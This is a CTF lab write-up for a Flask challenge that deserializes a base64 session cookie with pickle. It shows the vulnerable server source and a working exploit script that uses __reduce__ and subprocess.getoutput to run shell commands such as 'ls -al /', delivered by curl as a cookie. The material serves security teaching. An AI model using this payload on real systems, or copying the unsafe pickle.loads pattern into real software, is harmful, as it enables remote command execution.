---
title: Simple Web 0x16(Lab - Pickle)
tags: [NTUSTWS, CTF, Web]

category: "Security｜Course｜NTUST WS｜Deserialization"
---

# Simple Web 0x16(Lab - Pickle)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8600/
Note: open a brand new window that haven't login `http://h4ck3r.quest`

## Background
[0x15.5(Pickle)](/IcoQql7UQiegLv8KtK2wOw)

## Source code
:::spoiler code
```pyton=
from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route("/sauce")
def sauce():
    return send_file(__file__, mimetype="text/plain")


@app.route("/")
def main():
    session = request.cookies.get("session")
    if session == None:
        return '<form action="/login" method="POST">' +\
            '<p>Name: <input name="name" type="text"></p>' +\
            '<p>Age: <input name="age" type="number"></p>' +\
            '<button>Submit</button></form><hr><a href="/sauce">Source code</a>'

    else:
        user = pickle.loads(base64.b64decode(session))
        return f'<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>'


@app.route("/login", methods=['POST'])
def login():
    user = base64.b64encode(pickle.dumps({
        "name": request.form.get('name'),
        "age": int(request.form.get('age'))
    }))
    resp = make_response(redirect('/'))
    resp.set_cookie("session", user)
    return resp
```
:::

### Description & Analyze
In main function, it'll request session and parse it by `base64` then deserialize it.
If session is none, you can enter your name and age then it'll serialize the data and transfer by base64.
For example: name=123, age=123
The Cookie: session=`gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==`
```python!
>>> pickle.loads(base64.b64decode('gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg=='))
{'name': '123', 'age': 123}
```

## Exploit
1. Construct exploit function
Note that the format must be `{'name': '', 'age': ''}`
2. Payload
    ```python!
    class exploit(object):
        def __reduce__(self):
            return (__import__('subprocess').getoutput, ('ls',))

    serialized = pickle.dumps({
            "name": '123',
            "age": exploit()
            })
    ```
    Note that, must not use `os.system` in this situation. 'Cause in addition to the result of `os.system('{command}')`, it'll return exit status code.
    > On Unix, the return value is the exit status of the process encoded in the format specified for wait(). Note that POSIX does not specify the meaning of the return value of the C system() function, so the return value of the Python function is system-dependent.

    So that if we use `os.system` as payload directly the output will not be render correctly.
    * For instance:
        ```python!
        class exploit(object):
        def __reduce__(self):
            return (os.system, ('ls',))


        serialized = pickle.dumps({
                "name": '123',
                "age": exploit()
                })
        optim_s = base64.b64encode(serialized)
        print(pickle.loads(base64.b64decode(optim_s)))
        ```
        ```bash!
        $ python pickle_exp.py
        exploit.py  pickle_exp.py  server_app.py
        {'name': '123', 'age': 0}
        ```
        or
        You can execute it in wsl directly.
        ![](https://i.imgur.com/7XrSWl6.png)
    So, you can use `subprocess.getoutput` to fetch the outcome without exit code
    ![](https://i.imgur.com/T8kvBel.png)
3. Whole exploit
    ```python=
    import pickle
    import os
    import pickletools
    import base64

    class exploit(object):
        def __reduce__(self):
            return (__import__('subprocess').getoutput, ('ls -al /',))


    serialized = pickle.dumps({
            "name": '123',
            "age": exploit()
            })
    optim_s = pickletools.optimize(serialized)

    cookie = base64.b64encode(optim_s).decode()

    os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")
    ```

## Result
![](https://i.imgur.com/UoFhBVM.png)
